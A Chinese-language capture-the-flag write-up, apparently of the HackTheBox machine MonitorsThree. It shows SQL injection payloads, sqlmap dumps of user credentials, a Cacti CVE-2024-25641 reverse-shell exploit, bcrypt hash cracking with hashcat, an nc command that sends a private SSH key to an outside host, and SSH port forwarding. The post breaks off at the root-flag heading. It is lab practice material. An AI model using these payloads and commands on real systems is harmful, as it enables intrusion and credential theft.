&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;562&#34; src=&#34;../wp-contnt/uploads/2024/08/1724825103-image-1024x562.png&#34; alt=&#34;&#34; class=&#34;wp-image-126&#34; srcset=&#34;../legacy/uploads/2024/08/1724825103-image-1024x562.png 1024w, ../legacy/uploads/2024/08/1724825103-image-300x165.png 300w, ../legacy/uploads/2024/08/1724825103-image-768x422.png 768w, ../legacy/uploads/2024/08/1724825103-image.png 1442w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p class=&#34;has-text-align-center&#34;&gt;
  &lt;em&gt;Cacti 是一个开源的网络监控和图形绘制工具，它主要用于收集和显示来自各种设备（如路由器、交换机、服务器等）的网络数据，并将这些数据以图形化的方式呈现出来。Cacti 是基于 PHP 开发的网页应用，通常运行在 LAMP（Linux, Apache, MySQL, PHP）环境中。&lt;/em&gt;
&lt;/p&gt;
&lt;p&gt;尝试默认密码admin/admin失败。搜索对应版本的vulns，找到了CVE-2024-25641。此漏洞利用/lib/import.php中定义的import_packge()方法实现arbitrary files write。在利用这个漏洞前还是需要一个valid credential。gobuster遍历目录：&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;Output:
http://cacti.monitorsthree.htb/app (Status: 301) &amp;#91;--&amp;gt; http://cacti.monitorsthree.htb/app/]
http://cacti.monitorsthree.htb/cacti (Status: 301) &amp;#91;--&amp;gt; http://cacti.monitorsthree.htb/cacti/]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/cacti指向当前登录页面，/app指向先前的网页。&lt;/p&gt;
&lt;h3 id=&#34;sqli&#34;&gt;#SQLi
&lt;/h3&gt;&lt;p&gt;在&lt;a href=&#34;http://monitorsthree.htb/forgot_password.php&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;http://monitorsthree.htb/forgot_password.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://monitorsthree.htb/forgot_password.php&lt;/a&gt;&lt;/a&gt;网页尝试SQLi:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;-- -&lt;/strong&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;652&#34; height=&#34;693&#34; src=&#34;../wp-contnt/uploads/2024/08/1724825780-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-135&#34; srcset=&#34;../legacy/uploads/2024/08/1724825780-image.png 652w, ../legacy/uploads/2024/08/1724825780-image-282x300.png 282w&#34; sizes=&#34;auto, (max-width: 652px) 100vw, 652px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再尝试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;2&amp;rsquo;-- -&lt;/strong&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;628&#34; height=&#34;690&#34; src=&#34;../wp-contnt/uploads/2024/08/1724826188-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-140&#34; srcset=&#34;../legacy/uploads/2024/08/1724826188-image.png 628w, ../legacy/uploads/2024/08/1724826188-image-273x300.png 273w&#34; sizes=&#34;auto, (max-width: 628px) 100vw, 628px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以确定有SQLi漏洞了，用burpsuite保存请求，使用sqlmap看能不能获取到数据库：&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;sqlmap -r req --batch --dbs
Output:
...
&amp;#91;16:28:10] &amp;#91;INFO] checking if the injection point on POST parameter &#39;username&#39; is a false positive
POST parameter &#39;username&#39; is vulnerable. Do you want to keep testing the others (if any)? &amp;#91;y/N] N
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test&#39; AND (SELECT 4162 FROM (SELECT(SLEEP(5)))PcgJ) AND &#39;Iwlg&#39;=&#39;Iwlg
---
&amp;#91;16:29:26] &amp;#91;INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL &amp;gt;= 5.0.12 (MariaDB fork)
&amp;#91;16:29:26] &amp;#91;INFO] fetching database names
&amp;#91;16:29:26] &amp;#91;INFO] fetching number of databases
&amp;#91;16:29:26] &amp;#91;INFO] resumed: 2
&amp;#91;16:29:26] &amp;#91;INFO] resumed: information_schema
&amp;#91;16:29:26] &amp;#91;INFO] resumed: monitorsthree_db
available databases &amp;#91;2]:
&amp;#91;*] information_schema
&amp;#91;*] monitorsthree_db&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ok，成功了，服务器正在运行MySQL服务器。monitorsthree_db看起来不像是默认数据库，尝试得到tables list。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;sqlmap -r req --batch -D monitorsthree_db --tables&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跑了半小时也才蹦出来几个表名，实在等不下去了去dm了做出来的老哥。。。老哥说靠猜parameter。。。那好吧，猜一下表中会有user table。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;sqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T --level=3 --risk=3 --dump&lt;/code&gt;&lt;/pre&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    &lt;em&gt;-r: 请求文件，此处是从burpsuite里copy下来的请求&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--batch：自动接受默认选项&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;-D：数据库名&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;-T：table 名&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--threads: 线程数&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--technique：SQLi的技术，此处为Timebased&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--level：&lt;/em&gt;注入强度
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--risk：注入危险级别&lt;/em&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;em&gt;--dump：提取数据&lt;/em&gt;
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;果然有user table.&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;...
&amp;#91;16:40:51] &amp;#91;INFO] retrieved: id
&amp;#91;16:41:22] &amp;#91;INFO] retrieved: username
&amp;#91;16:43:19] &amp;#91;INFO] retrieved: email
&amp;#91;16:44:30] &amp;#91;INFO] retrieved: password
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提取到了两个重要的column名 username password，实在是太慢了，修改一下cmd&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;sqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T -C username,password --level=3 --risk=3 --dump&lt;/code&gt;&lt;/pre&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    -C: column名
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;终于看到了有用的信息&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;admin:green******&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用拿到的信息登录cacti&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;492&#34; src=&#34;../wp-contnt/uploads/2024/08/1724828226-image-1024x492.png&#34; alt=&#34;&#34; class=&#34;wp-image-180&#34; srcset=&#34;../legacy/uploads/2024/08/1724828226-image-1024x492.png 1024w, ../legacy/uploads/2024/08/1724828226-image-300x144.png 300w, ../legacy/uploads/2024/08/1724828226-image-768x369.png 768w, ../legacy/uploads/2024/08/1724828226-image-1536x738.png 1536w, ../legacy/uploads/2024/08/1724828226-image.png 1871w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;rce&#34;&gt;#RCE
&lt;/h3&gt;&lt;p&gt;搜索后在github找到了这个漏洞的Poc，&lt;a href=&#34;https://github.com/5ma1l/CVE-2024-25641&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/5ma1l/CVE-2024-25641&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/5ma1l/CVE-2024-25641&lt;/a&gt;&lt;/a&gt; clone下来。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;111&#34; src=&#34;../wp-contnt/uploads/2024/08/1724828402-image-1024x111.png&#34; alt=&#34;&#34; class=&#34;wp-image-187&#34; srcset=&#34;../legacy/uploads/2024/08/1724828402-image-1024x111.png 1024w, ../legacy/uploads/2024/08/1724828402-image-300x33.png 300w, ../legacy/uploads/2024/08/1724828402-image-768x83.png 768w, ../legacy/uploads/2024/08/1724828402-image-1536x167.png 1536w, ../legacy/uploads/2024/08/1724828402-image.png 1890w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;exploit需要四个输入&lt;/p&gt;
&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    URL：cacti服务器地址
  &lt;/li&gt;
  &lt;li&gt;
    username：用户名
  &lt;/li&gt;
  &lt;li&gt;
    password：密码
  &lt;/li&gt;
  &lt;li&gt;
    -payload：php数据
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在&lt;a href=&#34;https://www.revshells.com/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.revshells.com/&lt;/a&gt;&lt;/a&gt;里生成一个PHP PentestMonkey的reverse shell 并存到本地&lt;/p&gt;
&lt;p&gt;打开本地端口监听, 并尝试攻击&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;nc -nlvp 4444

# open another terminal &amp; run the following:
python3 exploit.py -p rev.php http://cacti.monitorsthree.htb/cacti admin greenxxxxxxx&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;203&#34; src=&#34;../wp-contnt/uploads/2024/08/1724828660-image-1024x203.png&#34; alt=&#34;&#34; class=&#34;wp-image-202&#34; srcset=&#34;../legacy/uploads/2024/08/1724828660-image-1024x203.png 1024w, ../legacy/uploads/2024/08/1724828660-image-300x59.png 300w, ../legacy/uploads/2024/08/1724828660-image-768x152.png 768w, ../legacy/uploads/2024/08/1724828660-image-1536x305.png 1536w, ../legacy/uploads/2024/08/1724828660-image.png 1785w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ok, 拿到shell。&lt;/p&gt;
&lt;h2 id=&#34;post-enumeration&#34;&gt;#Post Enumeration
&lt;/h2&gt;&lt;p&gt;先把shell升级一下变成TTY shell&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跑一些基础的enumeration指令&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;cat /etc/passwd | grep home
output:
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash

--------------------
ls -lah /etc/cron*
output:
ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.2K Mar 23  2022 /etc/crontab

/etc/cron.d:
total 36K
drwxr-xr-x   2 root root 4.0K Aug 28 02:47 .
drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   67 May 18 21:47 cacti
-rw-r--r--   1 root root   46 May 20 17:30 cleanup_cacti
-rw-r--r--   1 root root   47 May 21 16:24 cleanup_cron
-rw-r--r--   1 root root   69 Aug 18 10:18 duplicati
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  712 Jan  9  2024 php

/etc/cron.daily:
total 36K
drwxr-xr-x   2 root root 4.0K Aug 19 12:28 .
drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1.5K Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1.3K Mar 17  2022 man-db
-rwxr-xr-x   1 root root  652 Dec  7  2020 plocate

/etc/cron.hourly:
total 12K
drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12K
drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16K
drwxr-xr-x   2 root root 4.0K Aug 10  2023 .
drwxr-xr-x 118 root root 4.0K Aug 19 13:09 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
----------------------------
uname -a
output:
uname -a
Linux monitorsthree 5.15.0-118-generic #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
----------------------------
ss -anp
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                            
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1324/nginx: worker  
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      20072/python3       
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42331         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1259/mono 
----------------------------
ls -la /home/
output:
ls -la /home/
total 12
drwxr-xr-x  3 root   root   4096 May 26 16:34 .
drwxr-xr-x 18 root   root   4096 Aug 19 13:00 ..
drwxr-x---  4 marcus marcus 4096 Aug 16 11:35 marcus

......&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;机器还有另一个用户marcus，并没有找到什么有用的信息。看看网页配置文件。&lt;/p&gt;
&lt;p&gt;搜索网页 &lt;a href=&#34;https://files.cacti.net/docs/html/unix_configure_cacti.html&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;&lt;a class=&#34;link&#34; href=&#34;https://files.cacti.net/docs/html/unix_configure_cacti.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://files.cacti.net/docs/html/unix_configure_cacti.html&lt;/a&gt;&lt;/a&gt; 这里说了cacti配置文件在../include/config.php&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;481&#34; src=&#34;../wp-contnt/uploads/2024/08/1724829370-image-1024x481.png&#34; alt=&#34;&#34; class=&#34;wp-image-221&#34; srcset=&#34;../legacy/uploads/2024/08/1724829370-image-1024x481.png 1024w, ../legacy/uploads/2024/08/1724829370-image-300x141.png 300w, ../legacy/uploads/2024/08/1724829370-image-768x361.png 768w, ../legacy/uploads/2024/08/1724829370-image.png 1298w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;啊哈，找到了database用户密码。用mysql登录：&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;mysql -u cactiuser -h localhost -p
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 67197
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

MariaDB &amp;#91;(none)]&amp;gt;show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)
MariaDB &amp;#91;(none)]&amp;gt; use cacti
use cacti
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB &amp;#91;cacti]&amp;gt; show tables;
show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
| automation_tree_rule_items          |
| automation_tree_rules               |
| cdef                                |
| cdef_items                          |
| color_template_items                |
| color_templates                     |
| colors                              |
| data_debug                          |
| data_input                          |
| data_input_data                     |
| data_input_fields                   |
| data_local                          |
| data_source_profiles                |
| data_source_profiles_cf             |
| data_source_profiles_rra            |
| data_source_purge_action            |
| data_source_purge_temp              |
| data_source_stats_daily             |
| data_source_stats_hourly            |
| data_source_stats_hourly_cache      |
| data_source_stats_hourly_last       |
| data_source_stats_monthly           |
| data_source_stats_weekly            |
| data_source_stats_yearly            |
| data_template                       |
| data_template_data                  |
| data_template_rrd                   |
| external_links                      |
| graph_local                         |
| graph_template_input                |
| graph_template_input_defs           |
| graph_templates                     |
| graph_templates_gprint              |
| graph_templates_graph               |
| graph_templates_item                |
| graph_tree                          |
| graph_tree_items                    |
| host                                |
| host_graph                          |
| host_snmp_cache                     |
| host_snmp_query                     |
| host_template                       |
| host_template_graph                 |
| host_template_snmp_query            |
| plugin_config                       |
| plugin_db_changes                   |
| plugin_hooks                        |
| plugin_realms                       |
| poller                              |
| poller_command                      |
| poller_data_template_field_mappings |
| poller_item                         |
| poller_output                       |
| poller_output_boost                 |
| poller_output_boost_local_data_ids  |
| poller_output_boost_processes       |
| poller_output_realtime              |
| poller_reindex                      |
| poller_resource_cache               |
| poller_time                         |
| processes                           |
| reports                             |
| reports_items                       |
| rrdcheck                            |
| sessions                            |
| settings                            |
| settings_tree                       |
| settings_user                       |
| settings_user_group                 |
| sites                               |
| snmp_query                          |
| snmp_query_graph                    |
| snmp_query_graph_rrd                |
| snmp_query_graph_rrd_sv             |
| snmp_query_graph_sv                 |
| snmpagent_cache                     |
| snmpagent_cache_notifications       |
| snmpagent_cache_textual_conventions |
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_auth_row_cache                 |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
113 rows in set (0.001 sec)
MariaDB &amp;#91;cacti]&amp;gt; select * from user_auth;
select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.***************************************************** |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.000 sec)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;找到了marcus的hash，接下来就要交给hashcat了。**$2*$**的prefix一般都是bcrypt, 用hashcat暴力破解：&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;hashcat -m 3200 -a 0 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;679&#34; src=&#34;../wp-contnt/uploads/2024/08/1724829794-image-1024x679.png&#34; alt=&#34;&#34; class=&#34;wp-image-230&#34; srcset=&#34;../legacy/uploads/2024/08/1724829794-image-1024x679.png 1024w, ../legacy/uploads/2024/08/1724829794-image-300x199.png 300w, ../legacy/uploads/2024/08/1724829794-image-768x509.png 768w, ../legacy/uploads/2024/08/1724829794-image.png 1399w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;破解成功，拿到marcus密码。&lt;/p&gt;
&lt;h2 id=&#34;user-flag&#34;&gt;#User flag
&lt;/h2&gt;&lt;p&gt;用得到的credential 以marcus ssh 登录。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;CVE-2024-25641 git:(master): ssh marcus@cacti.monitorsthree.htb
marcus@cacti.monitorsthree.htb: Permission denied (publickey).&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;好吧，把密码认证关了，但我还有个active shell，直接su marcus试试。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;918&#34; height=&#34;172&#34; src=&#34;../wp-contnt/uploads/2024/08/1724830032-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-236&#34; srcset=&#34;../legacy/uploads/2024/08/1724830032-image.png 918w, ../legacy/uploads/2024/08/1724830032-image-300x56.png 300w, ../legacy/uploads/2024/08/1724830032-image-768x144.png 768w&#34; sizes=&#34;auto, (max-width: 918px) 100vw, 918px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功。在marcus home目录下找到user flag&lt;/p&gt;
&lt;h2 id=&#34;enumeration-again&#34;&gt;#Enumeration Again..
&lt;/h2&gt;&lt;p&gt;marcus home目录下有.ssh 文件夹，且里面有id_rsa 私钥。(这个id_rsa可能是别人留下的，好多人打一个机器, 但也可以用ssh-keygen 自己生成一对公私钥). 使用nc下载到本地&lt;/p&gt;
&lt;p&gt;ssh登录成功。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;nc 10.10.14.13 4445 &amp;lt; id_rsa

#kali
nc -nlvp 4445 &amp;gt; id_rsa

ssh -i id_rsa marcus@cacti.monitorsthree.htb
Last login: Tue Aug 20 11:34:00 2024
marcus@monitorsthree:~$&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在/opt/目录下发现了一些文件, /opt/目录通常是存放第三方软件的地方。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;drwxr-xr-x 3 root root 4096 May 20 15:53 backups
drwx--x--x 4 root root 4096 May 20 14:38 containerd
-rw-r--r-- 1 root root  318 May 26 16:08 docker-compose.yml
drwxr-xr-x 3 root root 4096 Aug 18 08:00 duplicati&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在/opt/duplicati/ 目录下发现了三个数据库文件&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;total 2832
drwxr-xr-x 2 root root    4096 Aug 18 08:00 control_dir_v2
-rw-r--r-- 1 root root 2461696 Aug 28 02:47 CTADPNHLTC.sqlite
-rw------- 1 root root  163840 Aug 28 04:34 DKKEDMSRFK.sqlite
-rw-r--r-- 1 root root   94208 Aug 28 04:40 Duplicati-server.sqlite
-rw------- 1 root root  167936 Aug 28 04:34 UZOFQVHQXW.sqlite&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用scp下载，并用sqlite打开查看。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;902&#34; src=&#34;../wp-contnt/uploads/2024/08/1724831500-image-1024x902.png&#34; alt=&#34;&#34; class=&#34;wp-image-255&#34; srcset=&#34;../legacy/uploads/2024/08/1724831500-image-1024x902.png 1024w, ../legacy/uploads/2024/08/1724831500-image-300x264.png 300w, ../legacy/uploads/2024/08/1724831500-image-768x676.png 768w, ../legacy/uploads/2024/08/1724831500-image.png 1266w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在Duplicati-server.sqlite数据库的option中发现了 server-passphrase。看着像base64加密的，尝试用base64解码&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;506&#34; height=&#34;60&#34; src=&#34;../wp-contnt/uploads/2024/08/1724831574-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-257&#34; srcset=&#34;../legacy/uploads/2024/08/1724831574-image.png 506w, ../legacy/uploads/2024/08/1724831574-image-300x36.png 300w&#34; sizes=&#34;auto, (max-width: 506px) 100vw, 506px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;乱码。。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;864&#34; height=&#34;162&#34; src=&#34;../wp-contnt/uploads/2024/08/1724831600-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-258&#34; srcset=&#34;../legacy/uploads/2024/08/1724831600-image.png 864w, ../legacy/uploads/2024/08/1724831600-image-300x56.png 300w, ../legacy/uploads/2024/08/1724831600-image-768x144.png 768w&#34; sizes=&#34;auto, (max-width: 864px) 100vw, 864px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也找不到对应的hash类型。先记录下。&lt;/p&gt;
&lt;p&gt;搜了一圈没再发现什么可疑的东西。想起服务器在内网开放了8200端口，用ssh port forward一下看看是什么。&lt;/p&gt;
&lt;pre class=&#34;wp-block-code language-bash&#34;&gt;&lt;code&gt;ssh -L 8200:127.0.0.1:8200 marcus@cacti.monitorsthree.htb -i id_rsa -N&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;root-flag&#34;&gt;#Root flag
